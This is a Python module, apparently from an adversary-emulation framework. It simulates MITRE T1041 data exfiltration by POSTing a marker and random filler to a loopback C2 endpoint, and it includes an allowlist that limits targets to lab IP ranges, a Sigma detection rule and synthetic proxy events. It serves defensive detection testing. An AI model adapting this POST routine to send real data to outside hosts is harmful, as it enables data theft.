"""T1041 — Exfiltration Over C2 Channel (simulation only).

Simulation: sends a small, clearly-labelled benign package to the C2 loopback
endpoint via HTTP POST. The body is **never real user data** — it contains a
fixed simulator header and random filler bytes, capped at ``max_bytes`` (default 512).

Safety: re-uses the same IP safety check as T1071.001 — only loopback and
RFC-1918/RFC-5737 ranges are permitted. External IPs are rejected hard.

Defensive value: validates that:
1. Data-exfiltration DLP rules fire on unexpected HTTP POSTs from endpoints.
2. Network detection (Zeek/Suricata) triggers on non-browser UA + binary body.
3. SIEM correlation between a prior C2 beacon (T1071.001) and a data POST.
"""
from __future__ import annotations

import ipaddress
import random
import time
import urllib.parse
from typing import Any

from ..base import TTP, TTPResult, registry


_EXFIL_MARKER = b"APT_SIM_EXFIL_BENIGN\x00"
_LAB_CIDRS = [
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("100.64.0.0/10"),
]


def _is_lab_ip(host: str) -> bool:
    try:
        addr = ipaddress.ip_address(host)
        return any(addr in net for net in _LAB_CIDRS)
    except ValueError:
        return host in ("localhost", "127.0.0.1", "::1")


def _check_url(url: str) -> str | None:
    """Return error string if URL is not targeting a lab address."""
    parsed = urllib.parse.urlparse(url)
    host = parsed.hostname or ""
    if not _is_lab_ip(host):
        return f"target '{host}' not in lab CIDR allowlist — exfil blocked"
    return None


class T1041ExfilOverC2(TTP):
    attack_id = "T1041"
    name = "Exfiltration Over C2 Channel (sim)"
    description = "POST a small benign marker package to the C2 loopback endpoint, simulating data exfiltration"
    tactic = "exfiltration"
    supported_platforms = ("windows", "linux", "darwin")

    def run(self, params: dict[str, Any]) -> TTPResult:
        started = time.time()
        url = str(params.get("url", "http://127.0.0.1:8765/healthz"))
        max_bytes = min(int(params.get("max_bytes", 512)), 4096)
        timeout = float(params.get("request_timeout", 5.0))
        seed = params.get("seed")

        err = _check_url(url)
        if err:
            return TTPResult(ok=False, error=err, started_at=started, finished_at=time.time())

        # Build a fake exfil payload (marker + random filler — never real data)
        rng = random.Random(seed)
        filler = bytes(rng.randint(0, 255) for _ in range(max(0, max_bytes - len(_EXFIL_MARKER))))
        body = _EXFIL_MARKER + filler

        try:
            import urllib.request
            req = urllib.request.Request(
                url,
                data=body,
                method="POST",
                headers={
                    "Content-Type": "application/octet-stream",
                    "X-Sim-Exfil": "true",
                    "User-Agent": "AptSim/1.0 (exfil-sim)",
                },
            )
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                status = resp.status
            return TTPResult(
                ok=True,
                output=f"exfil POST to {url}: HTTP {status}, body={len(body)}B",
                started_at=started,
                finished_at=time.time(),
                extra={"url": url, "bytes_sent": len(body), "http_status": status},
            )
        except OSError as exc:
            # Connection refused / timeout is expected in test envs — still counts as "ran"
            return TTPResult(
                ok=False,
                error=f"POST failed (expected in offline env): {exc}",
                started_at=started,
                finished_at=time.time(),
                extra={"url": url, "bytes_attempted": len(body)},
            )

    def sigma_rule(self) -> dict[str, Any]:
        return {
            "title": "Data Exfiltration over HTTP C2 Channel (APT Simulator T1041)",
            "id": "a1041000-0000-0000-0000-000000001041",
            "status": "experimental",
            "description": (
                "Detects HTTP POST requests to internal addresses with binary body and "
                "non-standard User-Agent — pattern of data exfiltration over a C2 channel."
            ),
            "references": ["https://attack.mitre.org/techniques/T1041"],
            "tags": ["attack.exfiltration", "attack.t1041"],
            "logsource": {"category": "proxy"},
            "detection": {
                "selection": {
                    "c-useragent|contains": ["AptSim/"],
                    "cs-method": "POST",
                },
                "condition": "selection",
            },
            "falsepositives": ["Legitimate monitoring agents posting metrics"],
            "level": "high",
        }

    def synthetic_events(self, params: dict[str, Any], result: Any = None) -> list[dict[str, Any]]:
        url = params.get("url", "http://127.0.0.1:8765/healthz")
        return [
            {
                "category": "proxy",
                "c-useragent": "AptSim/1.0 (exfil-sim)",
                "cs-method": "POST",
                "cs-uri-stem": url,
            }
        ]


registry.register(T1041ExfilOverC2())
